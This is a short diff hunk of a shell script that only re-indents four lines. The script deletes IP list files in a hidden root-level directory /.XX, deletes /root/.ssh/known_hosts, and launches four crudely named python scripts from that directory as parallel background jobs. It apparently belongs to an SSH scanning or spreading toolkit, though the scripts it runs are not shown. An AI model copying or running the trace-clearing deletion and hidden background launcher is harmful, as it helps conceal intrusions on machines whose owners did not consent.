@@ -91,16 +91,16 @@ rm -f /.XX/ip1.txt
 rm -f /.XX/ip2.txt
 rm -f /root/.ssh/known_hosts
 {
-python3 /.XX/fuckb1s.py
+ python3 /.XX/fuckb1s.py
 }&
 {
-python3 /.XX/fuckf2s.py
+ python3 /.XX/fuckf2s.py
 }&
 {
-python3 /.XX/fuckd2as.py
+ python3 /.XX/fuckd2as.py
 }&
 {
-python3 /.XX/fucke2bds.py
+ python3 /.XX/fucke2bds.py
 }&
 rm -f /.XX/fuck.txt
 wait
